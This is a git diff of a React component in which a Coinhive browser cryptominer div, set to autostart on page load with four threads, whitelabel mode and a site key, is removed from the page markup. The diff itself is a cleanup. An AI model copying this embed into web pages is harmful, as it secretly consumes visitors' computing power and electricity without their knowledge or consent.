@@ -92,25 +92,11 @@ class App extends Component {
     }
     var sectionStyle2 = {
       width: '256px',
-      height: '310px',
+      height: '260px'
     }
     return (
       <div id="main" style={sectionStyle}>
 
-      <div  id="broMenu" className="coinhive-miner" 
-        style={sectionStyle2}
-        data-key="6UtrrYYyMYrjRjXpipAn5FNt8SX0fdGc"
-        data-user="default"
-        data-autostart="true"
-        data-whitelabel="true"
-        data-background="#000000"
-        data-text="#eeeeee"
-        data-action="#ff0000"
-        data-graph="#ff0000"
-        data-threads="4"
-        data-throttle="0.1">
-        <em>Loading...</em>
-      </div>*
         <div>
           <Button id="form" bsStyle="default" bsSize="small" onClick={this.handleClickViewChange.bind(null, 3)}>Login</Button>
           <Button id="form" bsStyle="default" bsSize="small" onClick={this.handleClickViewChange.bind(null, 4)}>Signup</Button>
